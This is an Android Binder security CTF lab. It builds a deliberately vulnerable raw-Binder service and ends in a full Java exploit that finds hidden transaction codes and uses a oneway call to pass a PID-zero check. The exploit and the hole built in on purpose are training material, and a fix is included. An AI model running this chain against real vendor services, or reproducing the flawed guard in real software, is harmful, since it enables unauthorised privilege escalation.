# Lab 05 — CTF: The Unmarked Code

> **Difficulty:** hard
> **Time:** 3–5 hours
> **Needs:** everything from labs 01–04. `adb`, the NDK, Android Studio.
> **Flag format:** `FLAG{...}`
> **Prerequisite labs:** [01](lab-01-service-list-and-call.md), [02](lab-02-parcel-anatomy.md), [03](lab-03-identity-boundary.md), [04](lab-04-transaction-limits.md)

---

## The brief

> A vendor has shipped a background service called `ledger`. Their security team says it is safe,
> and they have three reasons.
>
> 1. *"It is not an AIDL service, so there is no public interface to attack."*
> 2. *"Every privileged operation checks the caller."*
> 3. *"The one entry point that does not check the caller can only be reached by the system."*
>
> All three statements are true. The service is still fully compromised by an ordinary app with no
> permissions.
>
> Retrieve the flag.

Three stages, each gating the next:

| Stage | What it tests | README |
|---|---|---|
| **1 — Find the door** | Transaction codes are not all small integers | [§3.8](../README.md#38-transaction-codes) |
| **2 — Say the password** | The interface token is not always advertised | [§3.9](../README.md#39-the-interface-token--a-security-control-not-a-formality) |
| **3 — Walk through it** | A guard that is *almost* right | [§3.10](../README.md#310-one-way-versus-synchronous), [§3.11.4](../README.md#3114-the-identity-api-set-ranked) |

Do not read the solution section until you have the flag, or until you have spent at least two hours
genuinely stuck. There are graduated hints between here and there.

---

## Build the challenge

One Android module. It has **no `.aidl` file** — that is the whole point of statement 1.

### `AndroidManifest.xml`

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.vendor.ledger">
    <application android:label="Ledger">
        <service
            android:name=".LedgerService"
            android:exported="true">
            <intent-filter>
                <action android:name="com.vendor.ledger.BIND" />
            </intent-filter>
        </service>
    </application>
</manifest>
```

Exported, no permission. That is realistic — it is how most OEM helper services ship.

### `LedgerService.java`

```java
package com.vendor.ledger;

import android.app.Service;
import android.content.Intent;
import android.os.Binder;
import android.os.IBinder;
import android.os.Parcel;
import android.os.Process;
import android.os.RemoteException;
import android.util.Log;

/**
 * A raw Binder service. No AIDL, no generated Stub, a hand-written onTransact.
 *
 * This shape is extremely common in OEM system services and in native daemons,
 * and it is exactly the shape lab 01 taught you to find: it does not answer
 * INTERFACE_TRANSACTION, so `service list` shows its interface as [].
 */
public class LedgerService extends Service {

    private static final String TAG = "Ledger";

    /**
     * Not advertised anywhere. queryLocalInterface() is not implemented and
     * INTERFACE_TRANSACTION is not handled, so an attacker cannot ask for it.
     * They can, however, read it out of the DEX.
     */
    private static final String DESCRIPTOR = "com.vendor.ledger.ILedger.v3";

    /** Codes 1 and 2 are the ordinary, documented, well-guarded ones. */
    private static final int TX_GET_VERSION = 1;
    private static final int TX_GET_BALANCE = 2;

    /**
     * The maintenance codes. They are NOT small integers, deliberately: the
     * vendor's threat model assumed nobody would find them by counting from 1.
     *
     * They are four ASCII characters packed big-endian, exactly like
     * INTERFACE_TRANSACTION ('_NTF') and DUMP_TRANSACTION ('_DMP').
     */
    private static final int TX_PREPARE = 0x5f505250;   // '_PRP'
    private static final int TX_REVEAL  = 0x5f52564c;   // '_RVL'

    /** Set by TX_PREPARE, read by TX_REVEAL. */
    private volatile boolean mMaintenanceMode = false;
    private volatile int     mPreparedForUid  = -1;

    private static final String FLAG = "FLAG{oneway_makes_the_pid_zero}";

    private final IBinder mBinder = new Binder() {
        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply, int flags)
                throws RemoteException {
            switch (code) {

                case TX_GET_VERSION: {
                    data.enforceInterface(DESCRIPTOR);
                    reply.writeNoException();
                    reply.writeString("ledger 3.1");
                    return true;
                }

                case TX_GET_BALANCE: {
                    data.enforceInterface(DESCRIPTOR);
                    // Statement 2 is true: this DOES check the caller, correctly.
                    final int uid = Binder.getCallingUidOrThrow();
                    if (uid != Process.SYSTEM_UID && uid != Process.myUid()) {
                        throw new SecurityException("balance: uid " + uid + " not permitted");
                    }
                    reply.writeNoException();
                    reply.writeInt(4212);
                    return true;
                }

                case TX_PREPARE: {
                    data.enforceInterface(DESCRIPTOR);
                    /*
                     * Statement 3. The vendor's reasoning, from their design doc:
                     *
                     *   "system_server calls this during OTA. A normal app cannot,
                     *    because we verify the caller is a system process. We use
                     *    the PID because the maintenance daemon runs under a
                     *    dynamic uid, and pid 0 is the kernel, which is trusted."
                     *
                     * Every sentence in that paragraph is wrong in a different way.
                     */
                    final int pid = Binder.getCallingPid();
                    if (pid != 0 && !isSystemPid(pid)) {
                        Log.w(TAG, "prepare refused for pid " + pid);
                        throw new SecurityException("prepare: pid " + pid + " not permitted");
                    }
                    mMaintenanceMode = true;
                    mPreparedForUid  = Binder.getCallingUid();   // this part IS honest
                    Log.i(TAG, "maintenance mode ON for uid " + mPreparedForUid);
                    reply.writeNoException();
                    return true;
                }

                case TX_REVEAL: {
                    data.enforceInterface(DESCRIPTOR);
                    if (!mMaintenanceMode) {
                        throw new IllegalStateException("not in maintenance mode");
                    }
                    // Note: this compares against the UID, which cannot be forged.
                    // It is the one check in the whole class that is unassailable,
                    // and it does not help, because it is checking the wrong thing.
                    if (Binder.getCallingUidOrThrow() != mPreparedForUid) {
                        throw new SecurityException("reveal: not the preparing uid");
                    }
                    reply.writeNoException();
                    reply.writeString(FLAG);
                    return true;
                }

                default:
                    return super.onTransact(code, data, reply, flags);
            }
        }
    };

    private boolean isSystemPid(int pid) {
        // Deliberately naive, and irrelevant to the solution.
        return pid == 1 || pid == getSystemServerPid();
    }

    private int getSystemServerPid() { return -1; }

    @Override public IBinder onBind(Intent intent) { return mBinder; }
}
```

Build it, install it, and confirm it is running:

```bash
# host
./gradlew :ledger:installDebug
adb shell am start-service -a com.vendor.ledger.BIND -n com.vendor.ledger/.LedgerService 2>/dev/null
adb shell dumpsys package com.vendor.ledger | grep -m1 userId
```

You will bind it from your attacker app rather than through `servicemanager` — it is an app service,
not a registered one. That is deliberate: it is the common case, and it forces you to work from an
app context, which is where every finding must be reproduced anyway (Lab 01 Task 7).

---

## Rules

1. **From an unprivileged app.** uid 10xxx, domain `untrusted_app`, no permissions declared beyond
   `<queries>`. Anything you do from `adb shell` is a lead, not a solution.
2. **No source access** while solving. You may decompile the installed APK — that is a legitimate
   attacker capability. Do not read `LedgerService.java` from your own build tree.
3. **No root**, no Frida on the target, no `su`. (Frida on *your own attacker app* is fine.)
4. **Do not modify the target.**

---

## Stage 1 — Find the door

### What you know

Binding gives you an `IBinder`. Ask it what it is:

```java
IBinder b;   // from onServiceConnected
Log.i("ctf", "descriptor = " + RawBinderClient.getDescriptor(b));
```

You will get an **empty string**. Lab 01 Task 5 told you what that means.

### Sweep

```java
RawBinderClient.sweepCodes(b, "", 1, 200);
```

You will find codes 1 and 2 and nothing else. Both refuse you.

### The wall

You now have a service with two guarded methods and no visible third. The brief says there is a
third — statement 3 refers to "the one entry point that does not check the caller".

**Question to answer before hint 1:** you swept 1 to 200. What is the actual valid range for a
transaction code, and how many values is that? Is sweeping it feasible? What else, in this chapter,
is a transaction code that is *not* a small integer?

<details>
<summary>Hint 1.1</summary>

Look at `INTERFACE_TRANSACTION`. It is 1598968902. That is not a random number — it is four ASCII
characters packed big-endian. `0x5f4e5446` is `'_' 'N' 'T' 'F'`.

AOSP uses that convention for codes that are not interface methods. So does everybody who copies
AOSP, which is everybody.

</details>

<details>
<summary>Hint 1.2</summary>

You do not have to guess the characters. Decompile the installed APK.

```bash
# host
adb shell pm path com.vendor.ledger
adb pull /data/app/.../base.apk ledger.apk
jadx -d out/ ledger.apk
grep -rn "0x5f\|1598\|1599" out/sources/
```

An integer constant beginning `0x5f` in a Binder service is a packed `'_XXX'` code.

</details>

<details>
<summary>Hint 1.3</summary>

If `jadx` is unhelpful, the constants are still in the DEX as literals. Smali:

```bash
# host
apktool d ledger.apk -o out_apktool
grep -rn -B2 -A40 "sparse-switch\|packed-switch" out_apktool/smali*/com/vendor/ledger/
```

The `.sparse-switch` block **is** the code table. Every literal in its left column is a transaction
code. Read it and you are done with Stage 1.

</details>

---

## Stage 2 — Say the password

You have a code. Sending it gets you:

```
SecurityException: Binder invocation to an incorrect interface
```

or a silent failure, depending on how you sent it.

**Question:** the object returned an *empty* descriptor from `INTERFACE_TRANSACTION`. So how can it
be enforcing an interface token?

<details>
<summary>Hint 2.1</summary>

`INTERFACE_TRANSACTION` is handled by `Binder.onTransact`'s default path, which returns the
descriptor that `attachInterface()` set. A raw `Binder` subclass that never calls `attachInterface`
has no descriptor to return — and can still call `data.enforceInterface("anything it likes")` inside
its own `onTransact`.

So: no way to *ask*. Every way to *look*.

</details>

<details>
<summary>Hint 2.2</summary>

Interface descriptors are string literals, and string literals survive R8 — both ends compare them at
runtime, so they cannot be renamed. See [README §6.5](../README.md#65-what-obfuscation-does-and-does-not-do).

```bash
# host
grep -rn 'enforceInterface' out_apktool/smali*/com/vendor/ledger/
grep -rn 'const-string' out_apktool/smali*/com/vendor/ledger/ | grep -i "ledger\|ILedger"
```

Or without any tooling at all:

```bash
# host
strings ledger.apk | grep -i "com.vendor.ledger"
unzip -p ledger.apk classes.dex | strings | grep -i "ILedger"
```

</details>

Once you have it, sanity-check by calling code 1:

```java
Parcel d = Parcel.obtain(), r = Parcel.obtain();
d.writeInterfaceToken(THE_DESCRIPTOR);
b.transact(1, d, r, 0);
r.readException();
Log.i("ctf", "version = " + r.readString());     // "ledger 3.1"
```

If that works, Stage 2 is done. If it throws *"Binder invocation to an incorrect interface"*, your
string is wrong — check for a version suffix and for exact case.

---

## Stage 3 — Walk through it

Now the interesting part. You have two undocumented codes. One sets a flag; one reads it. The one
that sets the flag refuses you:

```
SecurityException: prepare: pid <yours> not permitted
```

The vendor's claim: *"the one entry point that does not check the caller can only be reached by the
system."*

**Read the guard as an attacker.** It refuses you when your PID is not a system PID **and** your PID
is not zero. So it accepts you when your PID *is* zero.

**Question:** can your PID be zero?

<details>
<summary>Hint 3.1</summary>

Your process's PID is never zero. But the guard does not read your process's PID. It reads
`Binder.getCallingPid()`, which is a **property of the transaction**, filled in by the driver.

Where, in this chapter, is `getCallingPid()` documented as returning 0?

</details>

<details>
<summary>Hint 3.2</summary>

[README §3.10](../README.md#310-one-way-versus-synchronous):

| | Synchronous | `oneway` |
|---|---|---|
| `getCallingPid()` on the receiver | the real PID | **0** |

The driver records a sending thread only for synchronous transactions — for a one-way transaction
there is nobody to reply to, so `t->from` is `NULL` and the delivery path reports `sender_pid` as 0.

`sender_euid` is unaffected. It is still your real UID. That matters for the last step.

</details>

<details>
<summary>Hint 3.3</summary>

A `oneway` transaction is not a different method. It is the same transaction with a flag set:

```java
b.transact(TX_PREPARE, data, null, IBinder.FLAG_ONEWAY);
```

Note `null` for the reply and `FLAG_ONEWAY` for the flags. You will get no reply, no return value and
no exception — success and failure look identical from your side. That is the price.

</details>

<details>
<summary>Hint 3.4 — the last one</summary>

After the `oneway` prepare, the service stored `mPreparedForUid = Binder.getCallingUid()`.

`getCallingUid()` is **not** affected by `oneway`. It is your real UID, honestly recorded. So when
you call the reveal code *synchronously*, the service's check
`getCallingUidOrThrow() != mPreparedForUid` passes — because you really are the UID that prepared.

The one unforgeable check in the class does not help, because it is checking the wrong thing.

</details>

---

## Solving it with the shipped tools

You can complete Stage 3 from `adb shell` as a proof of concept, using
[`../examples/binder-probe.c`](../examples/binder-probe.c) — it grew a `--oneway` flag for exactly
this. But `ledger` is an **app** service, not registered with `servicemanager`, so `--call` cannot
resolve it by name. Use the app.

If you want to rehearse `--oneway` against something that *is* registered:

```bash
# adb shell
/data/local/tmp/binder-probe --call notification 2 --oneway
```

Measured on the reference device:

```
  ioctl round 1: write_consumed=68 read_consumed=8
    <- BR_NOOP (0x0000720c)
    <- BR_TRANSACTION_COMPLETE (0x00007206)
    one-way: BR_TRANSACTION_COMPLETE is all we get.
```

Compare with the synchronous run, where `read_consumed` was **76** and `BR_REPLY` followed. Eight
bytes versus seventy-six is the whole difference between "queued" and "answered".

---

## The solution

<details>
<summary>Full solution — do not open until you have the flag or have been stuck for two hours</summary>

### Stage 1

The codes are `'_PRP'` = `0x5f505250` = **1599099472** and `'_RVL'` = `0x5f52564c` =
**1599231564**, found in the `.sparse-switch` table of the decompiled `onTransact`. Sweeping 1..200
could never have found them; the `'_XXX'` convention is the lead.

Check the packing yourself rather than trusting the decimal:

```bash
# host
python3 -c "print(hex((ord('_')<<24)|(ord('P')<<16)|(ord('R')<<8)|ord('P')))"
# 0x5f505250
```

Note how close `'_PRP'` (1599099472) is to the standard `'_PNG'` (1599098439). Decimal transaction
codes in this range are almost always ASCII; convert them before assuming they are arbitrary.

### Stage 2

The descriptor is `com.vendor.ledger.ILedger.v3`, a string literal in the DEX. It is not obtainable
from the object, because a raw `Binder` that never calls `attachInterface()` returns nothing from
`INTERFACE_TRANSACTION` — while still enforcing a token of its own choosing inside `onTransact`.

### Stage 3

```java
private static final String DESC   = "com.vendor.ledger.ILedger.v3";
private static final int TX_PREPARE = 0x5f505250;
private static final int TX_REVEAL  = 0x5f52564c;

void solve(IBinder b) throws RemoteException {

    // Step 1 -- ONE-WAY prepare. The guard rejects any pid that is neither
    // zero nor a system pid. A one-way transaction arrives with pid 0,
    // because the driver records no sending thread for it.
    Parcel p = Parcel.obtain();
    try {
        p.writeInterfaceToken(DESC);
        b.transact(TX_PREPARE, p, null, IBinder.FLAG_ONEWAY);
    } finally {
        p.recycle();
    }

    // No reply, no exception, no confirmation. A oneway method is a poor
    // oracle -- we cannot tell from here whether it worked. Give the service
    // a moment, then ask a SYNCHRONOUS method that observes the same state.
    SystemClock.sleep(200);

    // Step 2 -- SYNCHRONOUS reveal. getCallingUid() was honest during the
    // prepare, so mPreparedForUid is genuinely us and the uid check passes.
    Parcel d = Parcel.obtain(), r = Parcel.obtain();
    try {
        d.writeInterfaceToken(DESC);
        b.transact(TX_REVEAL, d, r, 0);
        r.readException();
        Log.i("ctf", "FLAG = " + r.readString());
    } finally {
        r.recycle();
        d.recycle();
    }
}
```

**Flag:** `FLAG{oneway_makes_the_pid_zero}`

### Why each of the vendor's three statements was true and useless

**"It is not an AIDL service, so there is no public interface to attack."**
True, and it made the service *more* exposed, not less. No AIDL means no generated `Stub`, which
means the interface token and the argument parsing are whatever the author wrote. It also means the
codes are not constrained to 1..N, which the vendor treated as security through obscurity — and
which cost an attacker one `grep` over the smali.

**"Every privileged operation checks the caller."**
True. `getBalance` checks correctly. `reveal` checks correctly, on the UID, which cannot be forged.
Neither mattered, because the *state* they guard was set by a third method whose check was wrong.
**A correct check on the wrong thing is not a control.**

**"The one entry point that does not check the caller can only be reached by the system."**
False in three separate ways, and each is worth naming:

1. `getCallingPid()` is not an identity. It is recyclable, it races, and it is 0 on `oneway`.
2. `pid != 0` treats zero as trusted. Zero does not mean "the kernel". It means "the driver did not
   record a sender", which any caller can arrange.
3. The comment says the daemon "runs under a dynamic uid" — the design chose PID *because* UID was
   inconvenient. That is exactly backwards. If the identity you need is inconvenient, fix the
   design; do not authorise on a weaker one.

### The fix

```java
case TX_PREPARE: {
    data.enforceInterface(DESCRIPTOR);

    // 1. Refuse one-way delivery outright for any privileged entry point.
    //    A method that changes security-relevant state must be able to
    //    REPORT a refusal, and a oneway method cannot.
    if ((flags & IBinder.FLAG_ONEWAY) != 0) {
        Log.w(TAG, "prepare called one-way; refusing");
        return true;                       // nothing to reply to anyway
    }

    // 2. Authorise on the UID. It is the only identifier the caller cannot
    //    influence, and it is available on every transaction.
    final int uid = Binder.getCallingUidOrThrow();
    if (uid != Process.SYSTEM_UID && uid != Process.myUid()) {
        throw new SecurityException("prepare: uid " + uid + " not permitted");
    }

    mMaintenanceMode = true;
    mPreparedForUid  = uid;
    reply.writeNoException();
    return true;
}
```

Plus three changes that are not strictly necessary and should be made anyway:

- Add `android:permission="…"` with `protectionLevel="signature"` to the `<service>`, so that
  obtaining the `IBinder` at all requires the vendor's key. Remember this is checked **once**, at
  bind time, so it does not replace the check above.
- Give the maintenance state a **timeout**, so an unlock cannot persist indefinitely.
- Use an AIDL interface. It would have brought `enforceInterface` per case for free, and it would
  have made the undocumented codes impossible to add by accident.

</details>

---

## Scoring

| Points | Achievement |
|---|---|
| 10 | Identified that the empty descriptor means a raw `onTransact` with no generated stub |
| 15 | Recovered both undocumented transaction codes and explained the `'_XXX'` packing |
| 15 | Recovered the interface descriptor from the DEX and explained why it cannot be queried |
| 25 | Reached `prepare` via a one-way transaction |
| 20 | Retrieved the flag |
| 15 | Explained why the `reveal` UID check — the *correct* one — did not help |
| **+10** | Wrote the fix, refused one-way delivery on the privileged entry point, **and** said why the manifest permission is not a substitute |
| **+10** | Reproduced the whole chain from an unprivileged app rather than `adb shell` |

**100 is a pass. 120 means you could write the remediation ticket.**

---

## Debrief — what this was really testing

Every stage was a chapter section applied against something that pushes back.

| Stage | The idea | Where it came from |
|---|---|---|
| Empty descriptor | A raw `BBinder` enforces nothing you can query | [§3.9](../README.md#39-the-interface-token--a-security-control-not-a-formality), Lab 01 Task 5 |
| `'_XXX'` codes | Transaction codes are 32-bit integers, not an enumeration | [§3.8](../README.md#38-transaction-codes) |
| Descriptor in the DEX | Interface tokens survive obfuscation because both ends compare them | [§6.5](../README.md#65-what-obfuscation-does-and-does-not-do) |
| `oneway` → pid 0 | The driver records no sending thread for a one-way transaction | [§3.10](../README.md#310-one-way-versus-synchronous) |
| The honest UID check | `getCallingUid()` is unforgeable and that is not the same as sufficient | [§3.11](../README.md#311-identity--the-chapters-thesis-measured) |

And the sentence to take away, which is the chapter's thesis restated as a finding:

> **Binder gave the service a true answer to "who is calling". The service asked a different
> question.**

---

## Going further

- Add a fourth stage of your own: make `reveal` check `getCallingWorkSourceUid()` instead of
  `getCallingUid()` and see how much easier the challenge becomes. Then explain to a colleague why
  those two methods, whose names differ by one word, differ by the entire security model.
- Run [`../scripts/trace-binder-transactions.js`](../scripts/trace-binder-transactions.js) against
  the challenge while you solve it. `[ALARM 5]` fires on the empty descriptor immediately, and the
  `[IN ]` line for the prepare call shows `pid 0`, which is the solution announcing itself.
- Take a real OEM service off your own device — Lab 01 Task 4 produced the list — and run this
  methodology against it, with authorisation, on hardware you own.
